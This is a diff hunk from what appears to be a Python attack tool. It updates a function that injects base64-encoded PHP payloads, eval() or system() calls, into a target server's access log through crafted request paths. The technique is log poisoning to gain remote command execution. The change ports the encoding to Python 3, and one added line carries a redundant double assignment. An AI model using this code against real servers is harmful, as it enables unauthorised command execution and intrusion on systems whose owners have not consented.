@@ -938,12 +938,12 @@ def send_access_log_cmd(cmd, host, keyword):
     if "_PHP" in keyword:
         keyword = keyword[:-4]
         if " " in cmd:
-            b64cmd = base64.b64encode(cmd)
+            b64cmd = base64.b64encode(cmd).decode()
             path = "/<?php eval(base64_decode('%s'));?>" % b64cmd
         else:
             path = "/<?php %s?>" % cmd
     else:
-        b64cmd = base64.b64encode(cmd)
+        b64cmd = b64cmd = base64.b64encode(cmd).decode()
         path = "/<?php system(base64_decode('%s'));?>" % b64cmd
 
     s = NoURLEncodingSession()
